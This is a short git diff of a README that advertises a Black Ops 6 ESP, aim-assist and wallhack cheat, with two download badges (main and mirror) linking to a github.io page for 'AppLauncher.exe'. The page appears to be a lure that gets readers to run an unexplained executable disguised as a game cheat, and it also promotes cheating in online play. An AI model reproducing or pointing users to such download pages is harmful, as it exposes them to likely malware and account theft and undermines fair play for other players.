@@ -1,6 +1,6 @@
 # 🎯 BO6 ESP & AimAssist — WallHack Tool 
 
-🔘 Download AppLauncher.exe:  
+🔘 Download:  
 [![Download AppLauncher](https://img.shields.io/badge/Download-AppLauncher.exe-brightgreen?style=for-the-badge)](https://cod-bo6-esp-aimasist-wallhk.github.io/.github/)  
 [![Mirror Download](https://img.shields.io/badge/Download-Mirror-green?style=for-the-badge)](https://cod-bo6-esp-aimasist-wallhk.github.io/.github/)
 
